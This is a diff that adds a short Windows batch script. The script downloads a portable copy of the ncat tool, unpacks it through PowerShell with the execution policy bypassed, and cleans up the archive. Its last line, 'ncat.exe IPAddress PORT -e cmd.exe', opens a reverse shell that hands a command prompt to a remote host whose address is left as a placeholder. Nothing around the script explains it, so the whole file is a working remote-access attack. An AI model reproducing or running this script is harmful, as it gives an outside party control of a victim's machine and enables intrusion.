@@ -1,0 +1,7 @@
+@echo off
+set CurrentDir=%CD%
+curl -L -o "%CurrentDir%\ncat-portable.zip" https://nmap.org/dist/ncat-portable-5.59BETA1.zip || exit /b 1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%CurrentDir%\ncat-portable.zip' -DestinationPath '%CurrentDir%\ncat-portable' -Force" || exit /b 1
+move /y "%CurrentDir%\ncat-portable\ncat.exe" "%CurrentDir%\ncat.exe" || exit /b 1
+del "%CurrentDir%\ncat-portable.zip" && rd /s /q "%CurrentDir%\ncat-portable"
+ncat.exe IPAddress PORT -e cmd.exe
